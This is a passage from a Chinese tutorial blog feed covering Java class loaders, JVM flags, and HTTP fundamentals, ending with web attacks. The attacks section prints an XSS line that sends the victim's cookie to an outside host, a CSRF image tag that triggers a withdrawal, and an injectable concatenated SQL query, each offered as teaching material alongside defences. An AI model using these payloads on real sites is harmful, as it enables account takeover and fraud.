Model）。该模型要求除了顶层的启动类加载器外，其余的类加载器都应有自己的父类加载器。这里类加载器之间的父子关系一般通过组合（Composition）关系来实现，而不是通过继承（Inheritance）的关系实现。 （一）工作过程 一个类加载器首先将类加载请求传送到父类加载器，只有当父类加载器无法完成类加载请求时才尝试加载。 （二）好处 使得 Java 类随着它的类加载器一起具有一种带有优先级的层次关系，从而使得基础类得到统一。 例如 java.lang.Object 存放在 rt.jar 中，如果编写另外一个 java.lang.Object 的类并放到 ClassPath 中，程序可以编译通过。因为双亲委派模型的存在，所以在 rt.jar 中的 Object 比在 ClassPath 中的 Object 优先级更高，因为 rt.jar 中的 Object 使用的是启动类加载器，而 ClassPath 中的 Object 使用的是应用程序类加载器。正因为 rt.jar 中的 Object 优先级更高，因为程序中所有的 Object 都是这个 Object。 （三）实现 以下是抽象类 java.lang.ClassLoader 的代码片段，其中的 loadClass() 方法运行过程如下：先检查类是否已经加载过，如果没有则让父类加载器去加载。当父类加载器加载失败时抛出 ClassNotFoundException，此时尝试自己去加载。 1234567891011121314151617181920212223242526272829303132333435363738394041public abstract class ClassLoader &#123; // The parent class loader for delegation private final ClassLoader parent; public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123; return loadClass(name, false); &#125; protected Class&lt;?&gt; loadClass(String name, boolean resolve) throws ClassNotFoundException &#123; synchronized (getClassLoadingLock(name)) &#123; // First, check if the class has already been loaded Class&lt;?&gt; c = findLoadedClass(name); if (c == null) &#123; try &#123; if (parent != null) &#123; c = parent.loadClass(name, false); &#125; else &#123; c = findBootstrapClassOrNull(name); &#125; &#125; catch (ClassNotFoundException e) &#123; // ClassNotFoundException thrown if class not found // from the non-null parent class loader &#125; if (c == null) &#123; // If still not found, then invoke findClass in order // to find the class. c = findClass(name); &#125; &#125; if (resolve) &#123; resolveClass(c); &#125; return c; &#125; &#125; protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; throw new ClassNotFoundException(name); &#125;&#125; 4. 自定义类加载器实现FileSystemClassLoader 是自定义类加载器，继承自 java.lang.ClassLoader，用于加载文件系统上的类。它首先根据类的全名在文件系统上查找类的字节代码文件（.class 文件），然后读取该文件内容，最后通过 defineClass() 方法来把这些字节代码转换成 java.lang.Class 类的实例。 java.lang.ClassLoader 类的方法 loadClass() 实现了双亲委派模型的逻辑，因此自定义类加载器一般不去重写它，而是通过重写 findClass() 方法。 12345678910111213141516171819202122232425262728293031323334353637383940public class FileSystemClassLoader extends ClassLoader &#123; private String rootDir; public FileSystemClassLoader(String rootDir) &#123; this.rootDir = rootDir; &#125; protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; byte[] classData = getClassData(name); if (classData == null) &#123; throw new ClassNotFoundException(); &#125; else &#123; return defineClass(name, classData, 0, classData.length); &#125; &#125; private byte[] getClassData(String className) &#123; String path = classNameToPath(className); try &#123; InputStream ins = new FileInputStream(path); ByteArrayOutputStream baos = new ByteArrayOutputStream(); int bufferSize = 4096; byte[] buffer = new byte[bufferSize]; int bytesNumRead; while ((bytesNumRead = ins.read(buffer)) != -1) &#123; baos.write(buffer, 0, bytesNumRead); &#125; return baos.toByteArray(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return null; &#125; private String classNameToPath(String className) &#123; return rootDir + File.separatorChar + className.replace('.', File.separatorChar) + ".class"; &#125;&#125; 四、JVM 参数GC 优化配置 配置 描述 -Xms 初始化堆内存大小 -Xmx 堆内存最大值 -Xmn 新生代大小 -XX:PermSize 初始化永久代大小 -XX:MaxPermSize 永久代最大容量 GC 类型设置 配置 描述 -XX:+UseSerialGC 串行垃圾回收器 -XX:+UseParallelGC 并行垃圾回收器 -XX:+UseConcMarkSweepGC 并发标记扫描垃圾回收器 -XX:ParallelCMSThreads= 并发标记扫描垃圾回收器 = 为使用的线程数量 -XX:+UseG1GC G1 垃圾回收器 1java -Xmx12m -Xms3m -Xmn1m -XX:PermSize=20m -XX:MaxPermSize=20m -XX:+UseSerialGC -jar java-application.jar 转自： Java虚拟机]]></content>
      <tags>
        <tag>java虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP]]></title>
    <url>%2F2018%2F07%2F21%2FHTTP%2F</url>
    <content type="text"><![CDATA[HTTP协议是每一个做web层开发者必须理解的协议。 一 、基础概念Web 基础 WWW（World Wide Web）的三种技术：HTML、HTTP、URL HTML（HyperText Markup Language，超文本标记语言） HTTP（HyperText Transfer Protocol，超文本传输协议） RFC（Request for Comments，征求修正意见书），互联网的设计文档。 URL URI（Uniform Resource Indentifier，统一资源标识符） URL（Uniform Resource Locator，统一资源定位符） URN（Uniform Resource Name，统一资源名称），例如 urn:isbn:0-486-27557-4。 URI 包含 URL 和 URN，目前 WEB 只有 URL 比较流行，所以见到的基本都是 URL。 请求和响应报文1. 请求报文 2. 响应报文 二、HTTP 方法客户端发送的 请求报文 第一行为请求行，包含了方法字段。 GET 获取资源 当前网络请求中，绝大部分使用的是 GET 方法。 HEAD 获取报文首部 和 GET 方法一样，但是不返回报文实体主体部分。主要用于确认 URL 的有效性以及资源更新的日期时间等。 POST 传输实体主体 POST 主要用来传输数据，而 GET 主要用来获取资源。更多 POST 与 GET 的比较请见第八章。 PUT 上传文件 由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。 123456PUT /new.html HTTP/1.1Host: example.comContent-type: text/htmlContent-length: 16&lt;p&gt;New File&lt;/p&gt; PATCH 对资源进行部分修改 PUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。 1234567PATCH /file.txt HTTP/1.1Host: www.example.comContent-Type: application/exampleIf-Match: "e0023aa4e"Content-Length: 100[description of changes] DELETE 删除文件 与 PUT 功能相反，并且同样不带验证机制。 1DELETE /file.html HTTP/1.1 OPTIONS 查询支持的方法 查询指定的 URL 能够支持的方法。会返回 Allow: GET, POST, HEAD, OPTIONS 这样的内容。 CONNECT 要求用隧道协议连接代理 要求在与代理服务器通信时建立隧道，使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。 1CONNECT www.example.com:443 HTTP/1.1 TRACE 追踪路径 服务器会将通信路径返回给客户端。 发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。 通常不会使用 TRACE，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪），因此更不会去使用它。 三、HTTP 状态码服务器返回的 响应报文 中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。 状态码 类别 原因短语 1XX Informational（信息性状态码） 接收的请求正在处理 2XX Success（成功状态码） 请求正常处理完毕 3XX Redirection（重定向状态码） 需要进行附加操作以完成请求 4XX Client Error（客户端错误状态码） 服务器无法处理请求 5XX Server Error（服务器错误状态码） 服务器处理请求出错 1XX 信息 100 Continue ：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。 2XX 成功 200 OK 204 No Content ：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。 206 Partial Content ：表示客户端进行了范围请求。响应报文包含由 Content-Range 指定范围的实体内容。 3XX 重定向 301 Moved Permanently ：永久性重定向 302 Found ：临时性重定向 303 See Other ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。 注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。 304 Not Modified ：如果请求报文首部包含一些条件，例如：If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。 307 Temporary Redirect ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。 4XX 客户端错误 400 Bad Request ：请求报文中存在语法错误。 401 Unauthorized ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。 403 Forbidden ：请求被拒绝，服务器端没有必要给出拒绝的详细理由。 404 Not Found 5XX 服务器错误 500 Internal Server Error ：服务器正在执行请求时发生错误。 503 Service Unavilable ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。 四、HTTP 首部有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段。 各种首部字段及其含义如下（不需要全记，仅供查阅）： 通用首部字段 首部字段名 说明 Cache-Control 控制缓存的行为 Connection 控制不再转发给代理的首部字段、管理持久连接 Date 创建报文的日期时间 Pragma 报文指令 Trailer 报文末端的首部一览 Transfer-Encoding 指定报文主体的传输编码方式 Upgrade 升级为其他协议 Via 代理服务器的相关信息 Warning 错误通知 请求首部字段 首部字段名 说明 Accept 用户代理可处理的媒体类型 Accept-Charset 优先的字符集 Accept-Encoding 优先的内容编码 Accept-Language 优先的语言（自然语言） Authorization Web 认证信息 Expect 期待服务器的特定行为 From 用户的电子邮箱地址 Host 请求资源所在服务器 If-Match 比较实体标记（ETag） If-Modified-Since 比较资源的更新时间 If-None-Match 比较实体标记（与 If-Match 相反） If-Range 资源未更新时发送实体 Byte 的范围请求 If-Unmodified-Since 比较资源的更新时间（与 If-Modified-Since 相反） Max-Forwards 最大传输逐跳数 Proxy-Authorization 代理服务器要求客户端的认证信息 Range 实体的字节范围请求 Referer 对请求中 URI 的原始获取方 TE 传输编码的优先级 User-Agent HTTP 客户端程序的信息 响应首部字段 首部字段名 说明 Accept-Ranges 是否接受字节范围请求 Age 推算资源创建经过时间 ETag 资源的匹配信息 Location 令客户端重定向至指定 URI Proxy-Authenticate 代理服务器对客户端的认证信息 Retry-After 对再次发起请求的时机要求 Server HTTP 服务器的安装信息 Vary 代理服务器缓存的管理信息 WWW-Authenticate 服务器对客户端的认证信息 实体首部字段 首部字段名 说明 Allow 资源可支持的 HTTP 方法 Content-Encoding 实体主体适用的编码方式 Content-Language 实体主体的自然语言 Content-Length 实体主体的大小 Content-Location 替代对应资源的 URI Content-MD5 实体主体的报文摘要 Content-Range 实体主体的位置范围 Content-Type 实体主体的媒体类型 Expires 实体主体过期的日期时间 Last-Modified 资源的最后修改日期时间 五、具体应用CookieHTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。 Cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。它用于告知服务端两个请求是否来自同一浏览器，并保持用户的登录状态。 1. 用途 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息） 个性化设置（如用户自定义设置、主题等） 浏览器行为跟踪（如跟踪分析用户行为等） Cookie 曾一度用于客户端数据的存储，因为当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或 IndexedDB。 2. 创建过程服务器发送的响应报文包含 Set-Cookie 首部字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中。 123456HTTP/1.0 200 OKContent-type: text/htmlSet-Cookie: yummy_cookie=chocoSet-Cookie: tasty_cookie=strawberry[page content] 客户端之后对同一个服务器发送请求时，会从浏览器中读出 Cookie 信息通过 Cookie 请求首部字段发送给服务器。 123GET /sample_page.html HTTP/1.1Host: www.example.orgCookie: yummy_cookie=choco; tasty_cookie=strawberry 3. 分类 会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。 持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（Max-Age）之后就成为了持久性的 Cookie。 1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; 4. JavaScript 获取 Cookie通过 Document.cookie 属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。 123document.cookie = "yummy_cookie=choco";document.cookie = "tasty_cookie=strawberry";console.log(document.cookie); 5. Secure 和 HttpOnly标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。 标记为 HttpOnly 的 Cookie 不能被 JavaScript 脚本调用。因为跨域脚本 (XSS) 攻击常常使用 JavaScript 的 Document.cookie API 窃取用户的 Cookie 信息，因此使用 HttpOnly 标记可以在一定程度上避免 XSS 攻击。 1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly 6. 作用域Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则 Cookie 也包含在子域名中（如 developer.mozilla.org）。 Path 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F (“/“) 作为路径分隔符，子路径也会被匹配。例如，设置 Path=/docs，则以下地址都会匹配： /docs /docs/Web/ /docs/Web/HTTP 7. Session除了可以将用户信息通过 Cookie 存储在用户浏览器中，也可以利用 Session 存储在服务器端，存储在服务器端的信息更加安全。 Session 可以存储在服务器上的文件、数据库或者内存中，现在最常见的是将 Session 存储在内存型数据库中，比如 Redis。 使用 Session 维护用户登录的过程如下： 用户进行登录时，用户提交包含用户名和密码的表单，放入 HTTP 请求报文中； 服务器验证该用户名和密码； 如果正确则把用户信息存储到 Redis 中，它在 Redis 中的 ID 称为 Session ID； 服务器返回的响应报文的 Set-Cookie 首部字段包含了这个 Session ID，客户端收到响应报文之后将该 Cookie 值存入浏览器中； 客户端之后对同一个服务器进行请求时会包含该 Cookie 值，服务器收到之后提取出 Session ID，从 Redis 中取出用户信息，继续之后的业务操作。 应该注意 Session ID 的安全性问题，不能让它被恶意攻击者轻易获取，那么就不能产生一个容易被猜到的 Session ID 值。此外，还需要经常重新生成 Session ID。在对安全性要求极高的场景下，例如转账等操作，除了使用 Session 管理用户状态之外，还需要对用户进行重新验证，比如重新输入密码，或者使用短信验证码等方式。 8. 浏览器禁用 Cookie此时无法使用 Cookie 来保存用户信息，只能使用 Session。除此之外，不能再将 Session ID 存放到 Cookie 中，而是使用 URL 重写技术，将 Session ID 作为 URL 的参数进行传递。 9. Cookie 与 Session 选择 Cookie 只能存储 ASCII 码字符串，而 Session 则可以存取任何类型的数据，因此在考虑数据复杂性时 首选 Session； Cookie 存储在浏览器中，容易被恶意查看。如果非要将一些隐私数据存在 Cookie 中，可以将 Cookie 值进行加密，然后在服务器进行解密； 对于大型网站，如果用户所有的信息都存储在 Session 中，那么开销是非常大的，因此不建议将所有的用户信息都存储到 Session 中。 缓存1. 优点 缓解服务器压力； 减低客户端获取资源的延迟（缓存资源比服务器上的资源离客户端更近）。 2. 实现方法 让代理服务器进行缓存； 让客户端浏览器进行缓存。 3. Cache-ControlHTTP/1.1 通过 Cache-Control 首部字段来控制缓存。 （一）禁止进行缓存 no-store 指令规定不能对请求或响应的任何一部分进行缓存。 1Cache-Control: no-store （二）强制确认缓存 no-cache 指令规定缓存服务器需要先向源服务器验证缓存资源的有效性，只有当缓存资源有效才将能使用该缓存对客户端的请求进行响应。 1Cache-Control: no-cache （三）私有缓存和公共缓存 private 指令规定了将资源作为私有缓存，只能被单独用户所使用，一般存储在用户浏览器中。 1Cache-Control: private public 指令规定了将资源作为公共缓存，可以被多个用户所使用，一般存储在代理服务器中。 1Cache-Control: public （四）缓存过期机制 max-age 指令出现在请求报文中，并且缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。 max-age 指令出现在响应报文中，表示缓存资源在缓存服务器中保存的时间。 1Cache-Control: max-age=31536000 Expires 字段也可以用于告知缓存服务器该资源什么时候会过期。在 HTTP/1.1 中，会优先处理 Cache-Control : max-age 指令；而在 HTTP/1.0 中，Cache-Control : max-age 指令会被忽略掉。 1Expires: Wed, 04 Jul 2012 08:26:05 GMT 4. 缓存验证需要先了解 ETag 首部字段的含义，它是资源的唯一表示。URL 不能唯一表示资源，例如 http://www.google.com/ 有中文和英文两个资源，只有 ETag 才能对这两个资源进行唯一表示。 1ETag: "82e22293907ce725faf67773957acd12" 可以将缓存资源的 ETag 值放入 If-None-Match 首部，服务器收到该请求后，判断缓存资源的 ETag 值和资源的最新 ETag 值是否一致，如果一致则表示缓存资源有效，返回 304 Not Modified。 1If-None-Match: "82e22293907ce725faf67773957acd12" Last-Modified 首部字段也可以用于缓存验证，它包含在源服务器发送的响应报文中，指示源服务器对资源的最后修改时间。但是它是一种弱校验器，因为只能精确到一秒，所以它通常作为 ETag 的备用方案。如果响应首部字段里含有这个信息，客户端可以在后续的请求中带上 If-Modified-Since 来验证缓存。服务器只在所请求的资源在给定的日期时间之后对内容进行过修改的情况下才会将资源返回，状态码为 200 OK。如果请求的资源从那时起未经修改，那么返回一个不带有消息主体的 304 Not Modified 响应， 1Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT 1If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT 连接管理 1. 短连接与长连接当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问 HTML 页面资源，还会请求图片资源，如果每进行一次 HTTP 通信就要断开一次 TCP 连接，连接建立和断开的开销会很大。长连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。 HTTP/1.1 开始默认是长连接的，如果要断开连接，需要由客户端或者服务器端提出断开，使用 Connection : close；而在 HTTP/1.1 之前默认是短连接的，如果需要长连接，则使用 Connection : Keep-Alive。 2. 流水线默认情况下，HTTP 请求是按顺序发出的，下一个请求只有在当前请求收到应答过后才会被发出。由于会受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间。 流水线是在同一条长连接上发出连续的请求，而不用等待响应返回，这样可以避免连接延迟。 内容协商通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。 1. 类型（一）服务端驱动型内容协商 客户端设置特定的 HTTP 首部字段，例如 Accept、Accept-Charset、Accept-Encoding、Accept-Language、Content-Languag，服务器根据这些字段返回特定的资源。 它存在以下问题： 服务器很难知道客户端浏览器的全部信息； 客户端提供的信息相当冗长（HTTP/2 协议的首部压缩机制缓解了这个问题），并且存在隐私风险（HTTP 指纹识别技术）。 给定的资源需要返回不同的展现形式，共享缓存的效率会降低，而服务器端的实现会越来越复杂。 （二）代理驱动型协商 服务器返回 300 Multiple Choices 或者 406 Not Acceptable，客户端从中选出最合适的那个资源。 2. Vary1Vary: Accept-Language 在使用内容协商的情况下，只有当缓存服务器中的缓存满足内容协商条件时，才能使用该缓存，否则应该向源服务器请求该资源。 例如，一个客户端发送了一个包含 Accept-Language 首部字段的请求之后，源服务器返回的响应包含 Vary: Accept-Language 内容，缓存服务器对这个响应进行缓存之后，在客户端下一次访问同一个 URL 资源，并且 Accept-Language 与缓存中的对应的值相同时才会返回该缓存。 内容编码内容编码将实体主体进行压缩，从而减少传输的数据量。常用的内容编码有：gzip、compress、deflate、identity。 浏览器发送 Accept-Encoding 首部，其中包含有它所支持的压缩算法，以及各自的优先级，服务器则从中选择一种，使用该算法对响应的消息主体进行压缩，并且发送 Content-Encoding 首部来告知浏览器它选择了哪一种算法。由于该内容协商过程是基于编码类型来选择资源的展现形式的，在响应中，Vary 首部中至少要包含 Content-Encoding，这样的话，缓存服务器就可以对资源的不同展现形式进行缓存。 范围请求如果网络出现中断，服务器只发送了一部分数据，范围请求可以使得客户端只请求服务器未发送的那部分数据，从而避免服务器重新发送所有数据。 1. Range在请求报文中添加 Range 首部字段指定请求的范围。 123GET /z4d4kWk.jpg HTTP/1.1Host: i.imgur.comRange: bytes=0-1023 请求成功的话服务器返回的响应包含 206 Partial Content 状态码。 12345HTTP/1.1 206 Partial ContentContent-Range: bytes 0-1023/146515Content-Length: 1024...(binary content) 2. Accept-Ranges响应首部字段 Accept-Ranges 用于告知客户端是否能处理范围请求，可以处理使用 bytes，否则使用 none。 1Accept-Ranges: bytes 3. 响应状态码 在请求成功的情况下，服务器会返回 206 Partial Content 状态码。 在请求的范围越界的情况下，服务器会返回 416 Requested Range Not Satisfiable 状态码。 在不支持范围请求的情况下，服务器会返回 200 OK 状态码。 分块传输编码Chunked Transfer Coding，可以把数据分割成多块，让浏览器逐步显示页面。 多部分对象集合一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。 例如，上传多个表单时可以使用如下方式： 123456789101112Content-Type: multipart/form-data; boundary=AaB03x--AaB03xContent-Disposition: form-data; name="submit-name"Larry--AaB03xContent-Disposition: form-data; name="files"; filename="file1.txt"Content-Type: text/plain... contents of file1.txt ...--AaB03x-- 虚拟主机HTTP/1.1 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。 通信数据转发1. 代理代理服务器接受客户端的请求，并且转发给其它服务器。 使用代理的主要目的是： 缓存 网络访问控制 访问日志记录 代理服务器分为正向代理和反向代理两种，用户察觉得到正向代理的存在，而反向代理一般位于内部网络中，用户察觉不到。 2. 网关与代理服务器不同的是，网关服务器会将 HTTP 转化为其它协议进行通信，从而请求其它非 HTTP 服务器的服务。 3. 隧道使用 SSL 等加密手段，为客户端和服务器之间建立一条安全的通信线路。 六、HTTPsHTTP 有以下安全性问题： 使用明文进行通信，内容可能会被窃听； 不验证通信方的身份，通信方的身份有可能遭遇伪装； 无法证明报文的完整性，报文有可能遭篡改。 HTTPs 并不是新协议，而是让 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信。也就是说 HTTPs 使用了隧道进行通信。 通过使用 SSL，HTTPs 具有了加密（防窃听）、认证（防伪装）和完整性保护（防篡改）。 加密1. 对称密钥加密对称密钥加密（Symmetric-Key Encryption），加密的加密和解密使用同一密钥。 优点：运算速度快； 缺点：密钥容易被获取。 2. 公开密钥加密公开密钥加密（Public-Key Encryption），也称为非对称密钥加密，使用一对密钥用于加密和解密，分别为公开密钥和私有密钥。公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。 优点：更为安全； 缺点：运算速度慢； 3. HTTPs 采用的加密方式HTTPs 采用混合的加密机制，使用公开密钥加密用于传输对称密钥来保证安全性，之后使用对称密钥加密进行通信来保证效率。（下图中的 Session Key 就是对称密钥） 认证通过使用 证书 来对通信方进行认证。 数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。 服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。 进行 HTTPs 通信时，服务器会把证书发送给客户端。客户端取得其中的公开密钥之后，先使用数字签名进行验证，如果验证通过，就可以开始通信了。 完整性保护SSL 提供报文摘要功能来进行完整性保护。 HTTP 也提供了 MD5 报文摘要功能，但是却不是安全的。例如报文内容被篡改之后，同时重新计算 MD5 的值，通信接收方是无法意识到发生篡改。 HTTPs 的报文摘要功能之所以安全，是因为它结合了加密和认证这两个操作。试想一下，加密之后的报文，遭到篡改之后，也很难重新计算报文摘要，因为无法轻易获取明文。 HTTPs 的缺点 因为需要进行加密解密等过程，因此速度会更慢； 需要支付证书授权的高费用。 七、Web 攻击技术跨站脚本攻击1. 概念跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。 例如有一个论坛网站，攻击者可以在上面发布以下内容： 1&lt;script&gt;location.href="//domain.com/?c=" + document.cookie&lt;/script&gt; 之后该内容可能会被渲染成以下形式： 1&lt;p&gt;&lt;script&gt;location.href="//domain.com/?c=" + document.cookie&lt;/script&gt;&lt;/p&gt; 另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。 2. 危害 窃取用户的 Cookie 值 伪造虚假的输入表单骗取个人信息 显示伪造的文章或者图片 3. 防范手段（一）设置 Cookie 为 HttpOnly 设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，在一定程度上可以防止 XSS 窃取用户的 Cookie 信息。 （二）过滤特殊字符 许多语言都提供了对 HTML 的过滤： PHP 的 htmlentities() 或是 htmlspecialchars()。 Python 的 cgi.escape()。 Java 的 xssprotect (Open Source Library)。 Node.js 的 node-validator。 例如 htmlspecialchars() 可以将 &lt; 转义为 &amp;lt;，将 &gt; 转义为 &amp;gt;，从而避免 HTML 和 Jascript 代码的运行。 （三）富文本编辑器的处理 富文本编辑器允许用户输入 HTML 代码，就不能简单地将 &lt; 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。 富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，可以定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。 以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。 XSS 过滤在线测试 1234567891011121314151617181920212223242526&lt;h1 id="title"&gt;XSS Demo&lt;/h1&gt;&lt;p class="text-center"&gt;Sanitize untrusted HTML (to prevent XSS) with a configuration specified by a Whitelist.&lt;/p&gt;&lt;form&gt; &lt;input type="text" name="q" value="test"&gt; &lt;button id="submit"&gt;Submit&lt;/button&gt;&lt;/form&gt;&lt;pre&gt;hello&lt;/pre&gt;&lt;p&gt; &lt;a href="http://jsxss.com"&gt;http&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;Features:&lt;/h3&gt;&lt;ul&gt; &lt;li&gt;Specifies HTML tags and their attributes allowed with whitelist&lt;/li&gt; &lt;li&gt;Handle any tags or attributes using custom function&lt;/li&gt;&lt;/ul&gt;&lt;script type="text/javascript"&gt;alert(/xss/);&lt;/script&gt; 1234567891011121314151617181920212223242526&lt;h1&gt;XSS Demo&lt;/h1&gt;&lt;p&gt;Sanitize untrusted HTML (to prevent XSS) with a configuration specified by a Whitelist.&lt;/p&gt;&amp;lt;form&amp;gt; &amp;lt;input type="text" name="q" value="test"&amp;gt; &amp;lt;button id="submit"&amp;gt;Submit&amp;lt;/button&amp;gt;&amp;lt;/form&amp;gt;&lt;pre&gt;hello&lt;/pre&gt;&lt;p&gt; &lt;a href="http://jsxss.com"&gt;http&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;Features:&lt;/h3&gt;&lt;ul&gt; &lt;li&gt;Specifies HTML tags and their attributes allowed with whitelist&lt;/li&gt; &lt;li&gt;Handle any tags or attributes using custom function&lt;/li&gt;&lt;/ul&gt;&amp;lt;script type="text/javascript"&amp;gt;alert(/xss/);&amp;lt;/script&amp;gt; 跨站请求伪造1. 概念跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。 XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。 假如一家银行用以执行转账操作的 URL 地址如下： 1http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。 那么，一个恶意攻击者可以在另一个网站上放置如下代码： 1&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。 如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 资金。 这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。 透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。 2. 防范手段（一）检查 Referer 字段 HTTP 头中有一个 Referer 字段，这个字段用于标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer 字段应和请求的地址位于同一域名下。 这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。 （二）添加校验 Token 由于 CSRF 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行 CSRF 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过 CSRF 传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验 Token 的值为空或者错误，拒绝这个可疑请求。 也可以要求用户输入验证码来进行校验。 SQL 注入攻击1. 概念服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。 2. 攻击原理例如一个网站登录验证的 SQL 查询代码为： 1strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');" 